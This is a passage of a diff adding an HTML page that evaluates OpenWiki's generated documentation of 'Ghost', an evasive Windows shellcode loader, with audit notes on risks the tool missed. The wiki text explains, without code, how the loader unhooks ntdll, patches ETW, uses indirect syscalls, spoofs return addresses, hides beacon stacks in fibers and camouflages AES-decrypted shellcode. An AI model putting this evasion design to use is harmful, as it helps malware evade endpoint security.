@@ -1,0 +1,1572 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>OpenWiki · Ghost 完整 Wiki · 五工具 Wiki 对比</title>
+  <link rel="stylesheet" href="assets/site.css">
+</head>
+<body class="reader-page">
+  <header class="topbar"><a class="brand" href="index.html"><span>WIKI</span> 五工具对比</a><nav><a class="top-link " href="index.html">总览</a><a class="top-link " href="repository-intro.html">一分钟了解示例仓库</a><a class="top-link " href="local-skill.html">Local Skill</a><a class="top-link " href="devinwiki.html">DevinWiki</a><a class="top-link " href="deepwiki-open.html">deepwiki-open</a><a class="top-link active" href="openwiki.html">OpenWiki</a><a class="top-link " href="codewiki.html">CodeWiki</a><a class="top-link " href="issue-summary.html">七仓问题汇总</a></nav></header>
+  
+<div class="reader-shell" style="--accent:#167764">
+  <aside class="reader-sidebar"><a class="backline" href="repository-intro.html">← Ghost 说明</a>
+    <p class="eyebrow">完整成品 · Ghost</p><h1>OpenWiki</h1><p class="reader-position">证据入口和页面导航较清楚</p>
+    <div class="fact-pills"><span>11 个正文主题 + 4 个索引/导航页</span><span>26.6 分</span><span>成品 36.3K Token</span></div>
+    <div class="audit-note"><b>核查提示</b><p>Ghost 已确认漏报随机位置越界和 malloc/delete[] 不匹配两处风险。</p><a class="issue-jump" href="#ghost-openwiki-bounds">定位第一处标注 ↓</a></div>
+    <details class="side-issues" open><summary>当前 Ghost 错误与遗漏</summary><p>点击后直接跳到这份 Wiki 的对应原文。绿色表示工具正确识别了风险。</p><nav><a class="side-issue-link current tone-橙" href="#ghost-openwiki-bounds"><span>橙</span><div><b>随机位置未预留载荷长度</b><small>跳到当前 Wiki 原文标注</small></div></a><a class="side-issue-link current tone-橙" href="#ghost-openwiki-free"><span>橙</span><div><b>把错误释放方式当作正常清理</b><small>跳到当前 Wiki 原文标注</small></div></a></nav></details>
+    <label class="search-box"><span>搜索这份 Wiki</span><input id="wiki-search" type="search" placeholder="输入章节、接口或状态码"><small id="search-count">显示全部页面</small></label>
+    <nav class="wiki-toc"><a href="#page-1"><span>01</span>architecture/index</a><a href="#page-2"><span>02</span>architecture/loader-pipeline</a><a href="#page-3"><span>03</span>architecture/shared-types-and-constants</a><a href="#page-4"><span>04</span>concepts/api-resolution-and-hashing</a><a href="#page-5"><span>05</span>concepts/etw-patching</a><a href="#page-6"><span>06</span>concepts/fiber-based-stack-hiding</a><a href="#page-7"><span>07</span>concepts/index</a><a href="#page-8"><span>08</span>concepts/indirect-syscalls</a><a href="#page-9"><span>09</span>concepts/ntdll-unhooking</a><a href="#page-10"><span>10</span>concepts/return-address-spoofing</a><a href="#page-11"><span>11</span>concepts/shellcode-encryption-and-hiding</a><a href="#page-12"><span>12</span>index</a><a href="#page-13"><span>13</span>quickstart</a><a href="#page-14"><span>14</span>workflows/build-and-deploy</a><a href="#page-15"><span>15</span>workflows/index</a></nav>
+  </aside>
+  <main class="reader-main"><header class="reader-intro"><div><p class="eyebrow">阅读说明</p><h2>15 个 Markdown 页面，页面间跳转和源码入口最规整。</h2><p>准确抄出了随机偏移与 delete[]，但把它们当作正常流程，没有提醒代码本身不安全。</p></div>
+    <div class="mode-actions"><a class="button" href="raw/openwiki.html">打开原始展示版</a><a class="button" href="issue-summary.html">查看七仓问题</a></div></header>
+    <section class="tool-issue-map" id="tool-issues"><div class="current-repo-audit"><p class="eyebrow">当前 Ghost 的核查结果</p><strong class="current-error orange">本仓标出 2 处关键遗漏</strong><p>准确复述了代码，却没有告诉读者随机位置和释放方式不安全。</p></div>
+      <div class="cross-repo-audit"><b>其他仓库中该工具已经确认的问题</b><p>以下问题不发生在当前 Ghost 页面，点击可查看对应仓库、后果和源码证据。</p><div><a href="issue-summary.html#issue-01"><b>#01</b>同份 Wiki 命令矛盾</a><a href="issue-summary.html#issue-02"><b>#02</b>超时边界写错</a></div></div>
+    </section>
+    <div class="reading-legend"><span><i class="legend-red"></i>确认事实错误</span><span><i class="legend-orange"></i>关键风险遗漏</span><span><i class="legend-yellow"></i>容易误导</span><span><i class="legend-gray"></i>阅读或证据风险</span><span><i class="legend-green"></i>正确识别风险</span></div>
+    <section id="wiki-content" class="wiki-content"><article class="wiki-page" id="page-1"><div class="page-label">PAGE 1 · architecture/index.md</div><h1>Files</h1>
+<ul>
+<li><a href="#page-2">Loader Pipeline (End-to-End Execution Flow)</a> - The complete execution flow of Ghost.cpp from process start through the fiber-based sleep loop, showing the order of operations and how each evasion mechanism composes during loader startup and the beacon sleep cycle.</li>
+<li><a href="#page-3">Shared Types, Structures &amp; Constants (structs.h, types.h, defs.h)</a> - The foundational type definitions, NT structs, function-typedefs, and macros that every other Ghost module depends on, including the PEB/LDR types, PS_ATTRIBUTE and NtCreateUserProcess datatypes, indirect-syscall externs, and the error-handling and debug-print macros.</li>
+</ul>
+</article><article class="wiki-page" id="page-2"><div class="page-label">PAGE 2 · architecture/loader-pipeline.md</div><hr>
+<p>type: architecture
+title: Loader Pipeline (End-to-End Execution Flow)
+description: The complete execution flow of Ghost.cpp from process start through the fiber-based sleep loop, showing the order of operations and how each evasion mechanism composes during loader startup and the beacon sleep cycle.
+tags: [loader, execution-flow, fibers, return-address-spoofing, evasion]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-7923dc349e377706a428462b
+resource: repo://allocator.h</li>
+<li>id: openwiki-source-7b1ab98e51a2bbecffe695c6
+resource: repo://defs.h</li>
+<li>id: openwiki-source-6d868c08609ee9adc8759685
+resource: repo://etw.h</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-c959c853f7e9085f6114cb2f
+resource: repo://hook.h
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>Loader Pipeline (End-to-End Execution Flow)</h1>
+<p>Ghost is a standalone evasive Windows shellcode loader. Its entire runtime is orchestrated from <code>main()</code> in <code>Ghost.cpp</code>, which calls nearly every evasion mechanism in a strict sequence. Understanding this order — and how the heap-staged plaintext shellcode transitions into a fiber-hosted, executing beacon — is the key to reading the whole project.</p>
+<p>Two repository-level invariants make the pipeline readable:</p>
+<ul>
+<li><strong><code>RetSpoofCall</code> is the universal call wrapper.</strong> Nearly every API, NT call, and indirect syscall in the project is invoked through <code>RetSpoofCall(Function, nArgs, Gdgt, ...)</code>. It marshals the target function&#39;s real arguments, places a ROP gadget as the return address, and lets the target function return through it, so the true caller never appears on the stack during EDR unwinding. It is described in depth on the <a href="#page-10">return-address-spoofing</a> page.</li>
+<li><strong><code>Gdgt</code> is the shared ROP gadget pointer.</strong> Declared in <code>Ghost.cpp</code> as <code>PVOID Gdgt = FindROPGadget();</code> and <code>extern</code>&#39;d across <code>allocator.h</code>, <code>hook.h</code>, <code>etw.h</code>, <code>unhook.h</code>, <code>rsrc.h</code>, and <code>AES.h</code>, the same randomly-chosen <code>call r12</code> gadget from ntdll is threaded through every spoofed call. This keeps one consistent gadget as the return-target across all modules.</li>
+</ul>
+<h2>Startup Sequence in main()</h2>
+<p><code>main()</code> runs the loader in two phases: first it stages decrypted payload in hidden memory, then it converts the thread to fibers and executes it. The verified order is:</p>
+<div class="mermaid pending">flowchart TD
+    A[&quot;main() entry&quot;] --&gt; B[&quot;FlushNTDLL()&quot;]
+    B --&gt; C[&quot;PatchETW()&quot;]
+    C --&gt; D[&quot;GetFromRc(ResourceSize, ptr)&quot;]
+    D --&gt; E[&quot;RetSpoofCall(memcpy) ciphertext to heap&quot;]
+    E --&gt; F[&quot;AESDecrypt(AesCipherText,...)&quot;]
+    F --&gt; G[&quot;allocate_large_page(PlainBufferSize)&quot;]
+    G --&gt; H[&quot;place_data_rand(pLPI, plaintext, size)&quot;]
+    H --&gt; I[&quot;free(AesCipherText) + delete plaintext&quot;]
+    I --&gt; J[&quot;HookFunction(Sleep, FiberSwitcher)&quot;]
+    J --&gt; K[&quot;ConvertThreadToFiber -&gt; InitialFiber&quot;]
+    K --&gt; L[&quot;NtProtectVirtualMemory PAGE_EXECUTE_READ&quot;]
+    L --&gt; M[&quot;CreateFiber(entry = pLPI-&gt;lpData) -&gt; Creation&quot;]
+    M --&gt; N[&quot;SwitchToFiber loop&quot;]
+</div>
+<p><em>Startup sequence of <code>main()</code>: unhook, patch ETW, load+decrypt the resource, hide the payload in a large random allocation, install the Sleep hook, and set up the fiber pair.</em></p>
+<h3>1. FlushNTDLL()</h3>
+<p>The first call removes EDR hooks from ntdll by creating a suspended <code>audiodg.exe</code>, reading a clean ntdll image from it via the <code>SysNtReadVirtualMemory</code> indirect syscall, and copying the clean <code>.text</code> section back over the local copy. Details live on the <a href="#page-9">ntdll-unhooking</a> page.</p>
+<h3>2. PatchETW()</h3>
+<p>Disables Event Tracing for Windows by overwriting <code>NtTraceEvent</code> and <code>NtTraceControl</code> in ntdll with an early <code>ret</code> (<code>0xC3</code>), after making their image writable with <code>NtProtectVirtualMemory</code>. All protection and <code>memcpy</code> operations are ret-spoofed. See <a href="#page-5">etw-patching</a>.</p>
+<h3>3. GetFromRc() + AES decryption</h3>
+<p><code>GetFromRc()</code> (in <code>rsrc.h</code>) pulls the AES-encrypted shellcode out of the <code>IDR_RCDATA1</code> RCDATA resource using <code>FindResourceW</code> → <code>LoadResource</code> → <code>LockResource</code> → <code>SizeofResource</code> (all hash-resolved in <code>functions.h</code>, all ret-spoofed). <code>main()</code> copies the resource bytes into a heap buffer and calls <code>AESDecrypt()</code> with the hardcoded 32-byte key and 16-byte IV (regenerated per build by <code>build.py</code>). The decrypt path runs the full BCrypt chain — <code>BCryptOpenAlgorithmProvider</code>, <code>BCryptGetProperty</code>, <code>BCryptSetProperty</code> (CBC), <code>BCryptGenerateSymmetricKey</code>, and a two-pass <code>BCryptDecrypt</code> — every call wrapped in <code>RetSpoofCall</code>. See <a href="#page-11">shellcode-encryption-and-hiding</a>.</p>
+<h3>4. Allocation and payload hiding</h3>
+<p><code>allocate_large_page()</code> (in <code>allocator.h</code>) allocates a very large region sized <code>ALIGN_PAGE(PlainBufferSize * FACTOR)</code> with <code>FACTOR = 2048</code>, fills it with random cryptographic noise via <code>SystemFunction036</code> (RtlGenRandom), and picks a random byte offset within the block. <code>place_data_rand()</code> then copies the decrypted plaintext into that random slot. This is the Roshtyak camouflage technique used to defeat memory scanning. The decrypted heap buffer and ciphertext copy are freed immediately (<code>free(AesCipherText)</code> and <code>delete[] pPlainBuffer</code>) so the plaintext exists only inside the camouflaged allocation.</p>
+<h3>5. Hook Sleep and set up fibers</h3>
+<p><code>HookFunction(Sleep, FiberSwitcher)</code> installs a 13-byte trampoline hook (<code>mov r10, imm64</code> / <code>jmp r10</code>) over <code>Sleep</code> so that any call the beacon makes to <code>Sleep</code> diverts to <code>FiberSwitcher</code>. Then:</p>
+<ul>
+<li><code>ConvertThreadToFiber</code> turns the current loader thread into <code>InitialFiber</code>.</li>
+<li><code>NtProtectVirtualMemory</code> flips the large page to <code>PAGE_EXECUTE_READ</code>, making the staged payload executable.</li>
+<li><code>CreateFiber(NULL, (LPFIBER_START_ROUTINE)pLPI-&gt;lpData, NULL)</code> creates the <code>Creation</code> fiber whose start routine is the decrypted, now-executable shellcode (<code>pLPI-&gt;lpData</code>).</li>
+</ul>
+<p>All three of these calls are ret-spoofed. The <code>NtProtectVirtualMemory</code> result is checked with <code>NTAPI_VALIDATE_RETURN2NULL(NtProtect_MAIN, status)</code>, so a failure returns <code>NULL</code> from <code>main</code>.</p>
+<h2>The Fiber Switching Sleep Cycle</h2>
+<p>Once both fibers exist, <code>main()</code> enters an infinite loop that alternates between running the payload fiber and sleeping the loader thread:</p>
+<div class="mermaid pending">sequenceDiagram
+    participant M as main (InitialFiber)
+    participant P as PayloadFiber (lpData)
+    participant S as Sleep hook / FiberSwitcher
+    participant D as DelayExecution
+
+    loop while true
+        M-&gt;&gt;P: SwitchToFiber(Creation)
+        Note over P: payload/beacon runs
+        P-&gt;&gt;S: calls Sleep(dwMilliseconds)
+        S-&gt;&gt;S: stores dwSleepTime
+        S-&gt;&gt;M: SwitchToFiber(InitialFiber)
+        Note over M: beacon stack hidden
+        M-&gt;&gt;D: DelayExecution(dwSleepTime)
+        Note over D: NtCreateEvent + NtWaitForSingleObject
+        D--&gt;&gt;M: returns after delay
+    end
+</div>
+<p><em>The fiber switching sleep cycle: the payload fiber runs until it calls Sleep, the hook switches back to the loader fiber, the loader performs a kernel-invisible event-based delay, then control returns to the payload.</em></p>
+<p>The loop in <code>main()</code> first calls <code>RetSpoofCall(e_SwitchToFiber, 1, Gdgt, Creation)</code> to hand control to the payload fiber and execute the beacon. When the beacon calls <code>Sleep</code>, the hook redirects to <code>FiberSwitcher</code> (in <code>hook.h</code>), which:</p>
+<ol>
+<li>Records the requested duration in the global <code>dwSleepTime</code> so the real sleep can be reproduced later.</li>
+<li>Switches back to <code>InitialFiber</code> via <code>RetSpoofCall(e_SwitchToFiber, 1, Gdgt, InitialFiber)</code>.</li>
+</ol>
+<p>Because fibers are userland-only execution units, neither fiber switch nor the sleeping state emits kernel callbacks, and the beacon&#39;s entire call stack disappears from the thread stack while it is not running. Control returns to <code>main()</code> after the <code>SwitchToFiber</code> at the top of the loop returns; <code>main()</code> then calls <code>DelayExecution(dwSleepTime)</code> to actually sleep. <code>DelayExecution</code> (in <code>hook.h</code>) creates an event with <code>NtCreateEvent</code> and waits on it with <code>NtWaitForSingleObject</code> using a negated relative timeout — both ret-spoofed — so the loader thread blocks without the beacon visible on the stack. The loop then repeats.</p>
+<p>The <code>Sleep</code> hooking assumes a Cobalt Strike-style beacon that sleeps via <code>kernel32!Sleep</code>. For other C2 frameworks the README notes a different sleep API (e.g., one of NightHawk&#39;s <code>CreateThreadPool</code> APIs) must be hooked instead; the pipeline is identical otherwise.</p>
+<h2>Error Handling and Constants</h2>
+<p>The project composes error handling and fake handles from <code>defs.h</code>, which every module includes:</p>
+<ul>
+<li><code>SELF_HANDLE</code> = <code>(HANDLE)-1</code> — pseudo-handle passed as the process handle to NT VM APIs, meaning &quot;the current process&quot;. It is threaded through <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code>, and the indirect syscalls.</li>
+<li><code>CURRENT_THREAD</code> = <code>(HANDLE)-2</code> — pseudo-handle for the current thread, available for thread-targeted NT calls.</li>
+<li><code>NTAPI_VALIDATE_RETURN</code>, <code>NTAPI_VALIDATE_RETURN2VOID</code>, and <code>NTAPI_VALIDATE_RETURN2NULL</code> — all three check an <code>NTSTATUS != 0</code> and print <code>{!!} &lt;API&gt; failed with status: &lt;hex&gt;</code>, differing in the return value on failure: <code>-1</code>, <code>void</code> (bare return), or <code>NULL</code> respectively. <code>main()</code> uses <code>NTAPI_VALIDATE_RETURN2NULL(NtProtect_MAIN, status)</code> after flipping the large page; <code>allocate_large_page</code> uses the same macro after <code>NtAllocateVirtualMemory</code>; <code>HookFunction</code> and <code>PatchETW</code> use the <code>2VOID</code> variant.</li>
+<li><code>NTAPI_ERR</code>, <code>HANDLE_ERROR</code>, and <code>PRINT</code> are additional logging helpers, and <code>_DEBUG_PRINT</code> toggles all debug <code>std::cout</code> output at compile time (it is defined by default in <code>defs.h</code>).</li>
+</ul>
+<p>These macros keep the failure semantics uniform across modules without relying on <code>GetLastError</code> for NT statuses, which is why NT calls are validated directly against their returned <code>NTSTATUS</code>.</p>
+<h2>Failure Semantics</h2>
+<ul>
+<li>If <code>AESDecrypt</code> fails, <code>main()</code> prints <code>[+] Decryption UnSuccessful</code> and returns <code>-1</code> before any allocation or fiber setup.</li>
+<li>If <code>allocate_large_page</code> cannot allocate, it returns <code>NULL</code> (via <code>NTAPI_VALIDATE_RETURN2NULL</code>), and the pipeline aborts.</li>
+<li>If the <code>NtProtectVirtualMemory</code> making the page executable fails, <code>main()</code> returns <code>NULL</code>.</li>
+<li>Because each step depends on the previous one&#39;s side effects (decrypted buffer → large page → executable fiber entry point), a failure at any step halts the loader before the payload fiber is ever scheduled.</li>
+</ul>
+<h2>Relationship to Other Pages</h2>
+<ul>
+<li><a href="#page-9">ntdll-unhooking</a> — the <code>FlushNTDLL()</code> phase.</li>
+<li><a href="#page-5">etw-patching</a> — the <code>PatchETW()</code> phase.</li>
+<li><a href="#page-11">shellcode-encryption-and-hiding</a> — resource load, AES decryption, and memory camouflage.</li>
+<li><a href="#page-6">fiber-based-stack-hiding</a> — the <code>HookFunction(Sleep)</code> / fiber-switching mechanism.</li>
+<li><a href="#page-10">return-address-spoofing</a> — the <code>RetSpoofCall</code> wrapper and <code>Gdgt</code> used throughout.</li>
+<li><a href="#page-4">api-resolution-and-hashing</a> — how all functions are resolved at runtime via <code>functions.h</code>.</li>
+</ul>
+</article><article class="wiki-page" id="page-3"><div class="page-label">PAGE 3 · architecture/shared-types-and-constants.md</div><hr>
+<p>type: architecture
+title: Shared Types, Structures &amp; Constants (structs.h, types.h, defs.h)
+description: The foundational type definitions, NT structs, function-typedefs, and macros that every other Ghost module depends on, including the PEB/LDR types, PS_ATTRIBUTE and NtCreateUserProcess datatypes, indirect-syscall externs, and the error-handling and debug-print macros.
+tags: [types, nt-structures, function-typedefs, macros, pdb, ps-attribute, indirect-syscalls]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-e0fa2003814e1fa147c561c8
+resource: repo://build.py</li>
+<li>id: openwiki-source-7b1ab98e51a2bbecffe695c6
+resource: repo://defs.h</li>
+<li>id: openwiki-source-6d868c08609ee9adc8759685
+resource: repo://etw.h</li>
+<li>id: openwiki-source-dcba33204cd15ff156692bf1
+resource: repo://functions.h</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-4e7b26c8e7c6aa4453161bae
+resource: repo://ntprocessapi.h</li>
+<li>id: openwiki-source-41a9d90bce8783b40d1ac50c
+resource: repo://Resource.rc</li>
+<li>id: openwiki-source-623cbff6c7e51d628ceced79
+resource: repo://resource1.h</li>
+<li>id: openwiki-source-5cb3011b8d6f9c28cfbb8ee6
+resource: repo://rsrc.h</li>
+<li>id: openwiki-source-dc732a9699d4eb3a37e389fd
+resource: repo://structs.h</li>
+<li>id: openwiki-source-28a2ba913c2f3cb2e3abbe21
+resource: repo://syscalls.asm</li>
+<li>id: openwiki-source-c8aabaf2fabb5e1e597ff399
+resource: repo://types.h</li>
+<li>id: openwiki-source-16495399652492148bfde7f3
+resource: repo://unhook.h
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>Shared Types, Structures &amp; Constants (structs.h, types.h, defs.h)</h1>
+<p>Ghost is an evasive shellcode loader whose modules (<code>unhook.h</code>, <code>etw.h</code>, <code>allocator.h</code>, <code>hook.h</code>, <code>rsrc.h</code>, <code>AES.h</code>, <code>ntprocessapi.h</code>, and <code>Ghost.cpp</code>) all depend on a small set of shared headers. This page documents the reusable <strong>types</strong>, <strong>NT structures</strong>, <strong>function-pointer typedefs</strong>, and <strong>compiler macros</strong> that those modules rely on. Nearly everything here is custom because the loader deliberately avoids importing most Windows SDK definitions and instead re-declares the low-level types it needs (or relies on hashed dynamic resolution rather than static linking).</p>
+<p>Three headers together form this foundation:</p>
+<ul>
+<li><strong><code>structs.h</code></strong> — custom re-declarations of NT kernel-user structures (PEB, LDR, process parameters) and everything needed to call <code>NtCreateUserProcess</code> directly (PS_ATTRIBUTE_LIST, PS_CREATE_INFO, OBJECT_ATTRIBUTES, USTRING).</li>
+<li><strong><code>types.h</code></strong> — function-pointer typedefs for every dynamically resolved API, plus the <code>extern &quot;C&quot;</code> prototypes of the indirect syscall wrappers assembled in <code>syscalls.asm</code>.</li>
+<li><strong><code>defs.h</code></strong> — small compile-time macros and constants used as a shared vocabulary across modules.</li>
+</ul>
+<h2>Relationship to the rest of the project</h2>
+<p>These headers sit at the bottom of the dependency graph. <code>types.h</code> includes both <code>structs.h</code> and <code>defs.h</code>, and <code>functions.h</code> includes <code>types.h</code> and instantiates the actual function-pointer globals by hash-resolution. That one module (<code>functions.h</code>) is the single bridge that turns the typedefs into live <code>GetFunctionAddressH</code>-resolved function pointers, which every other module then calls — almost always through <code>RetSpoofCall</code>.</p>
+<h2>The custom NT structures in structs.h</h2>
+<p>Ghost cannot rely on the public Windows SDK exposing the internal layouts it needs (or wants to keep explicit), so <code>structs.h</code> re-declares them with the <code>P...</code> pointer aliases. The header opens by re-declaring <code>RTL_HEAP_ENTRY</code> (credited to AceLdr), a heap-entry structure whose <code>DataAddress</code>/<code>DataSize</code> fields are used to walk the process heap when locating an in-memory payload region.</p>
+<h3>PEB and loader types</h3>
+<p>The process environment block and loader structures are the ones an EDR-aware loader inspects or walks. Their comments cite the Windows Internals book and Process Hacker sources:</p>
+<ul>
+<li><strong><code>PEB_LDR_DATA</code></strong> — the loader data block: <code>InLoadOrderModuleList</code>, <code>InMemoryOrderModuleList</code>, and <code>InInitializationOrderModuleList</code> are the three <code>LIST_ENTRY</code> module lists that code walks to enumerate loaded modules (e.g. to find ntdll by name).</li>
+<li><strong><code>PEB</code></strong> — the process environment block. Notable fields include <code>BeingDebugged</code> (the classic debugger check), the <code>BitField</code> union (<code>IsProtectedProcess</code>, <code>IsAppContainer</code>, <code>IsProtectedProcessLight</code>, etc.), <code>ImageBaseAddress</code>, and <code>Ldr</code> (pointer to <code>PEB_LDR_DATA</code>). This is a deliberately partial declaration (the trailing <code>//...</code> indicates the remaining fields are omitted).</li>
+<li><strong><code>LDR_DATA_TABLE_ENTRY</code></strong> — one entry in the loader module lists: <code>DllBase</code>, <code>EntryPoint</code>, <code>SizeOfImage</code>, <code>FullDllName</code>, <code>BaseDllName</code>. Walking <code>InLoadOrderModuleList</code> and matching <code>BaseDllName</code> is how the resolver locates ntdll by hash (see <code>resolvers.h</code>/<code>GetLoadedDllHandleH</code>).</li>
+</ul>
+<p>The <code>USTRING</code> struct (a local <code>DWORD</code>/<code>PVOID</code> variant of <code>UNICODE_STRING</code>) is the buffer carrier used by the RC4 init macros in <code>defs.h</code>.</p>
+<h2>NtCreateUserProcess datatypes</h2>
+<p>The loader creates a suspended sacrificial process (<code>audiodg.exe</code>) to harvest a clean ntdll, and it does so with a direct call to <code>NtCreateUserProcess</code> rather than the Win32 <code>CreateProcess</code>. That requires a full set of NT datatypes that <code>structs.h</code> provides:</p>
+<ul>
+<li><strong><code>RTL_USER_PROCESS_PARAMETERS</code></strong> and the <code>RTL_USER_PROCESS_PARAMETERS_NORMALIZED</code> flag (0x01) — built with <code>RtlCreateProcessParametersEx</code> before spawning.</li>
+<li><strong><code>CURDIR</code></strong> / <strong><code>RTL_DRIVE_LETTER_CURDIR</code></strong> and <code>RTL_MAX_DRIVE_LETTERS (32)</code> — the current-directory and per-drive current-directory records embedded in process parameters.</li>
+<li><strong><code>PS_ATTRIBUTE</code> / <code>PS_ATTRIBUTE_LIST</code></strong> — the attribute mechanism passed to <code>NtCreateUserProcess</code>. The <code>PS_ATTRIBUTE_NUM</code> enum lists every attribute (<code>PsAttributeParentProcess</code>, <code>PsAttributeImageName</code>, <code>PsAttributeMitigationOptions</code>, ...). <code>PsAttributeValue(Number, Thread, Input, Additive)</code> is the macro that packs a number plus the thread/input/additive flags (<code>PS_ATTRIBUTE_THREAD 0x10000</code>, <code>PS_ATTRIBUTE_INPUT 0x20000</code>, <code>PS_ATTRIBUTE_ADDITIVE 0x40000</code>, <code>PS_ATTRIBUTE_NUMBER_MASK 0xffff</code>) into the 64-bit <code>Attribute</code> field. In <code>ntprocessapi.h</code>, <code>PS_ATTRIBUTE_IMAGE_NAME = PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)</code> selects the input-only image-name attribute, so the loader can tell <code>NtCreateUserProcess</code> which executable to create suspended.</li>
+<li><strong><code>PS_PROTECTION</code>/<code>PS_PROTECTED_TYPE</code>/<code>PS_PROTECTED_SIGNER</code></strong> — the protected-process levels (used with <code>ProcessProtectionInformation</code>).</li>
+<li><strong><code>PS_CREATE_INFO</code> / <code>PS_CREATE_STATE</code></strong> — the union that receives the outcome of <code>NtCreateUserProcess</code>: <code>InitialState</code> carries input init-flags (<code>WriteOutputOnExit</code>, <code>DetectManifest</code>, etc.), and <code>SuccessState</code> carries the resulting <code>FileHandle</code>, <code>SectionHandle</code>, <code>PebAddressNative</code>, and <code>UserProcessParametersNative</code>. The caller initializes <code>CreateInfo.Size</code> and <code>CreateInfo.State = PsCreateInitialState</code> before the call (see <code>NtCreateUserSuspendedProcess</code>).</li>
+<li><strong><code>OBJECT_ATTRIBUTES</code></strong> — re-declared so optional object-attributes parameters can be passed by the syscall signatures.</li>
+</ul>
+<h3>PROCESSINFOCLASS enum</h3>
+<p><code>structs.h</code> also carries the full <code>PROCESSINFOCLASS</code> enum (a commented list of ~110 process-info classes with their query/set directions and value types). It is referenced when calling <code>NtQueryInformationProcess</code>-style queries such as <code>ProcessDebugPort</code> or <code>ProcessDebugObjectHandle</code>.</p>
+<h2>Function-pointer typedefs in types.h</h2>
+<p>Because nearly every imported function is resolved at runtime by hash (never linked by import table), <code>types.h</code> declares a heterogeneous set of <strong>function-pointer typedefs</strong> whose signatures match the real APIs. These are grouped by target module:</p>
+<ul>
+<li><strong>ntdll NT APIs</strong> — <code>fNtAllocateVirtualMemory</code>, <code>fNtWriteVirtualMemory</code>, <code>fNtReadVirtualMemory</code>, <code>fNtProtectVirtualMemory</code> (the memory manipulation used by the allocator, ETW patching, and unhooking), plus <code>fnNtWaitForSingleObject</code>, <code>fNtCreateEvent</code>, and the <code>RtlCreateProcessParametersEx</code> / <code>RtlInitUnicodeString</code> helpers used to build process parameters.</li>
+<li><strong>kernelbase APIs</strong> — <code>fnConvertThreadToFiber</code>, <code>fnCreateFiber</code>, <code>fnSwitchToFiber</code> (the fiber machinery in <code>Ghost.cpp</code> and <code>hook.h</code>), and the resource helpers <code>fnFindResourceW</code>, <code>fnLoadResource</code>, <code>fnLockResource</code>, <code>fnSizeofResource</code> (used by <code>rsrc.h</code>/<code>GetFromRc</code> for <code>IDR_RCDATA1</code>).</li>
+<li><strong>BCrypt AES APIs</strong> — <code>fnBCryptOpenAlgorithmProvider</code>, <code>fnBCryptGetProperty</code>, <code>fnBCryptSetProperty</code>, <code>fnBCryptGenerateSymmetricKey</code>, <code>fnBCryptDecrypt</code>, <code>fnBCryptDestroyKey</code>, <code>fnBCryptCloseAlgorithmProvider</code>, consumed by <code>AES.h</code>&#39;s decryption chain.</li>
+</ul>
+<p>Each typedef is the contract for the global function pointer of the same name declared in <code>functions.h</code>, which resolves it with <code>GetFunctionAddressH(hModule, hash)</code>. So the typedefs and the <code>functions.h</code> globals are two halves of the same hashed-resolution design — the typedef defines the call signature, and <code>functions.h</code> supplies the address.</p>
+<h2>Indirect syscall extern declarations</h2>
+<p>In addition to resolved direct calls, the loader performs <strong>indirect syscalls</strong> to evade userland hooks on the most critical operations. <code>types.h</code> declares the prototypes with <code>extern &quot;C&quot;</code> (C linkage so the assembly can reference them by the plain symbol names):</p>
+<ul>
+<li><code>SysNtCreateUserProcess</code> — the 11-argument process/thread spawn that underlies <code>ntprocessapi.h</code>&#39;s <code>NtCreateUserSuspendedProcess</code>.</li>
+<li><code>SysNtReadVirtualMemory</code> — reads a clean ntdll image out of the suspended process in <code>unhook.h</code>.</li>
+<li><code>SysNtProtectVirtualMemory</code> — flips page protections during unhooking and payload staging.</li>
+<li><code>SysNtTerminateProcess</code> — closes the sacrificial helper process after its ntdll is read.</li>
+</ul>
+<p>These <code>Sys*</code> names are implemented in <strong><code>syscalls.asm</code></strong> (NASM syntax), which loads the per-syscall SSN (<code>dwNt*</code>) and the syscall address (<code>sysCallNt*</code>) and jumps into ntdll&#39;s <code>syscall</code> stub to avoid executing the first bytes of the hooked function. The SSN/address pairs are themselves filled by <code>GetSysCallByWalking</code> in <code>functions.h</code>. This is the boundary where <code>types.h</code> (the C/C++ contract) meets the raw assembly layer, and it is what the <a href="#page-8">indirect-syscalls</a> and <a href="#page-9">ntdll-unhooking</a> pages build on.</p>
+<h2>Macros and constants in defs.h</h2>
+<ul>
+<li><strong><code>SELF_HANDLE ((HANDLE)(-1))</code></strong> and <strong><code>CURRENT_THREAD ((HANDLE)(-2))</code></strong> — the NT pseudo-handles for the current process and current thread, passed as the first argument to <code>NtAllocateVirtualMemory</code>, <code>NtProtectVirtualMemory</code>, etc. across <code>allocator.h</code>, <code>unhook.h</code>, <code>etw.h</code>, and <code>hook.h</code>.</li>
+<li><strong><code>HANDLE_ERROR(FUNCTION, ERROR_MSG)</code></strong> — prints a function name plus a message literal.</li>
+<li><strong><code>NTAPI_ERR(NTAPI, status)</code></strong> — prints <code>{!!} &lt;name&gt; failed with status: &lt;hex&gt;</code>.</li>
+<li><strong><code>PRINT(DATA)</code></strong> and <strong><code>API_ERR(API)</code></strong> — general output helpers (<code>API_ERR</code> prints <code>GetLastError()</code>).</li>
+<li><strong><code>NTAPI_VALIDATE_RETURN(...)</code></strong> — checks an <code>NTSTATUS</code> against 0 (STATUS_SUCCESS) and, on failure, prints the name and hex status and returns <code>-1</code>; the <code>NTAPI_VALIDATE_RETURN2VOID</code> and <code>NTAPI_VALIDATE_RETURN2NULL</code> variants return <code>void</code> and <code>NULL</code> respectively. These are the project&#39;s primary NT error-handling pattern, used heavily in <code>etw.h</code> (e.g. <code>NTAPI_VALIDATE_RETURN2VOID(NtProtectControl, ...)</code>).</li>
